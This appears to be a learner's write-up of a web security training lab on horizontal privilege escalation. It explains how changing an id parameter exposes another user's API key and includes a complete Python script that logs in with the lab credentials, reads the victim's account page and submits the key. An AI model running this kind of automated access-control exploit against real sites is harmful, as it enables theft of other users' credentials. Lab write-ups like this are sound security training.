This lab has a horizontal privilege escalation vulnerability on the user account page.

To solve the lab, obtain the API key for the user `carlos` and submit it as the solution.

You can log in to your own account using the following credentials: `wiener:peter`

---

Goal: obtain api key for carlos

My account page has a vulnerable id parameter allowing me to change user by simply changing: `/my-account?id=wiener` to `/my-account?id=carlos`

script details

POST /login
- User data
GET /my-account?id=carlos
- grab with soup: `Your API Key is: ZcDIi1RVndT5rEntdTV9nCsmKRnd05mA`
POST /submitSolution
- Data: `answer=ZcDIi1RVndT5rEntdTV9nCsmKRnd05mA`

This took a while but i got it done. The exploit fully completes the lab without any user input needed, apart from the initial command to start the program:

```php
./<Name_of_the_program> https://<www.example.com>
```

```python
#!/usr/bin/python3

import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Get csrf token
def get_csrf(s, clean_url):
	print('[+] Tring to get csrf.')
	login_url = clean_url + '/login'
	r = s.get(login_url, verify=False, proxies=proxies)
	soup = BeautifulSoup(r.text, 'html.parser')
	csrf = soup.find("input")['value']
	return csrf
	

# Login to wiener user account
def login_user(s, clean_url):
	csrf = get_csrf(s, clean_url)
	print('[+] Logging into user account.')
	data = {'csrf': csrf, 'username': 'wiener', 'password': 'peter'}
	login_url = clean_url + '/login'
	r = s.post(login_url, data=data, verify=False, proxies=proxies)
	if 'Log out' in r.text:
		print('Success!')
		post_api_key(s, clean_url)
	else:
		print('Login failed...')
		sys.exit(-2)

# Exploit access control to get carlos's api key  (add if else functionality)
def obtain_api(s, clean_url):
	print('[+] Trying to get api for user carlos')
	vuln_path = clean_url + '/my-account?id=carlos'
	r = s.get(vuln_path, verify=False, proxies=proxies)
	#soup = BeautifulSoup(r.text, 'html.parser')
	res = r.text
	api_key = re.search("Your API Key is:(.*)", res).group(1)
	clean_api_key = api_key.split('</div>')[0]
	clean_api_key = clean_api_key.strip()
	return clean_api_key
	
	
# Post API Key and complete the lab
def post_api_key(s, clean_url):
	solution_url = clean_url + '/submitSolution'
	api = obtain_api(s, clean_url)
	data = {'answer': api}
	r = s.post(solution_url, data=data, verify=False, proxies=proxies)
	
	
# Print user instructions
def main():
	if len(sys.argv) != 2:
		print('[+] Usage: %s <URL>' % sys.argv[0])
		print('[+] Example: %s www.example.com' % sys.argv[0])
		sys.exit(-1)
	
	url = sys.argv[1]
	clean_url = url.rstrip("/")
	s = requests.Session()
	login_user(s, clean_url)

if __name__ == '__main__':
	main()
```

- I don't think i ended up using soup, but needed re instead. Look up info about re module as it will be useful at a later stage.
